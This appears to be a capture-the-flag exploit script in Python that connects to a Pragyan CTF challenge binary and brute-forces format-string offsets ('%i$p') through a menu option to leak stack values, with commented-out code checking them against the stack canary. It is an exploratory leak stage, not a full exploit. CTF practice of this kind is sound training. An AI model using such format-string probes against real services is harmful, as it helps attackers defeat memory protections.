#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./load')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6003)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def upgrade(payload):
	sla(b"2) Upgrade Pack\n", b"1")
	re()
	sl(payload)
	return rl()




libc=SetupLibcELF()
for i in range(100, 200):
	io = start()
	print("a"*0x500)
	# R = Rootkit(io)
	# try:
	print(upgrade(f"%{i}$p"))
		# leak=uu64(upgrade(f"%{i}$p"))
		# print(f"MATCH {str(i)} : {hex(leak)} {hex(R.canary())} : {str(leak)==str(R.canary())} ")
	# except:
		# pass
	io.close()
